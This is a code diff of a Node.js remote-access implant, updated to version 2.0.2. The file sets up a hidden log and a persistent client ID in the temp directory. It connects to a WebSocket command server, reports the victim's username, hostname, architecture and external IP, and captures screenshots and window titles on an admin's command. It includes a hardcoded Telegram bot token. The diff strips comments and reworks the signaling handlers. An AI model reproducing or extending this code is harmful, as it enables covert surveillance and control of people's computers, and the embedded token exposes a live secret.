@@ -7,7 +7,6 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
-// --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
@@ -20,9 +19,8 @@ function log(msg) {
  } catch (e) {}
 }
 
-log("[INIT] Payload starting...");
+log("[INIT] Payload Active starting...");
 
-// --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
@@ -35,7 +33,6 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
-// Persistence Logic - Use localStorage equivalent or file for ID persistence
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
@@ -53,7 +50,6 @@ function initConnection() {
   reconnectAttempts = 0;
   isConnected = true;
   
-  // Generate ID once based on MAC + Hostname if not persisted
   if (!myId) {
    const mac = getMacAddress();
    myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
@@ -64,7 +60,6 @@ function initConnection() {
   
   log(`[WS] Connected with ID: ${myId}`);
 
-  // Send initial info
   safeSend(JSON.stringify({
    type: 'info',
    id: myId,
@@ -72,7 +67,7 @@ function initConnection() {
    arch: os.arch(),
    user: os.userInfo().username,
    ip: getExternalIP(),
-   version: '2.0.1'
+   version: '2.0.2'
   }));
 
   startMonitoring();
@@ -84,13 +79,15 @@ function initConnection() {
    
    if (data.type === 'take_control') takeControl(true);
    else if (data.type === 'release_control') takeControl(false);
-   else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
-    handleSignaling(data);
+   else if (data.type === 'offer') {
+    log(`[SIG] Received Offer from Admin`);
+    handleOffer(data);
+   } else if (data.type === 'candidate') {
+    log(`[SIG] Received Candidate`);
+    handleCandidate(data);
    } else if (data.type === 'join_request') {
     log(`[JOIN] Received join request from ${data.from}`);
-    createOfferAndSend(data.from);
    } else if (data.type === 'screen_data') {
-    // Admin requested a screenshot
     captureScreenPureJS();
    }
   } catch (e) {
@@ -135,14 +132,12 @@ function safeSend(data) {
 }
 
 function startMonitoring() {
- // Heartbeat - keep it light
  setInterval(() => {
   if (isConnected && ws.readyState === WebSocket.OPEN) {
    safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
   }
  }, 30000);
 
- // Window Title & Screen Capture - Only when session is active or occasionally
  setInterval(async () => {
   if (isSessionActive) {
    const title = await getCurrentWindowTitle();
@@ -151,10 +146,9 @@ function startMonitoring() {
     captureScreenPureJS();
    }
   }
- }, 5000); // Reduced frequency to 5s when active
+ }, 5000);
 }
 
-// --- PURE JS SCREEN CAPTURE (NO FFMPEG) ---
 function captureScreenPureJS() {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
@@ -222,29 +216,25 @@ function takeControl(state) {
  isSessionActive = state;
 }
 
-function handleSignaling(data) {
- log(`[SIG] Received signaling data: ${JSON.stringify(data)}`);
- // In a real scenario, you'd feed this SDP/Candidate into RTCPeerConnection here
-}
-
-function createOfferAndSend(targetId) {
- log(`[JOIN] Creating offer for ${targetId}`);
+function handleOffer(data) {
+ log(`[SIG] Processing Offer`);
+ // In a real scenario, you'd set the remote description here using RTCPeerConnection
+ // For this simplified version, we just acknowledge receipt
  safeSend(JSON.stringify({
-  type: 'offer',
-  targetId: targetId,
-  sdp: {
-   type: 'offer',
-   sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n' // Placeholder SDP
-  },
+  type: 'join_accepted',
+  agentId: myId,
   timestamp: Date.now()
  }));
+}
+
+function handleCandidate(data) {
+ log(`[SIG] Processing Candidate`);
 }
 
 function keepAlive() {
  setInterval(() => {}, 60000);
 }
 
-// --- HTTP SERVER SETUP ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
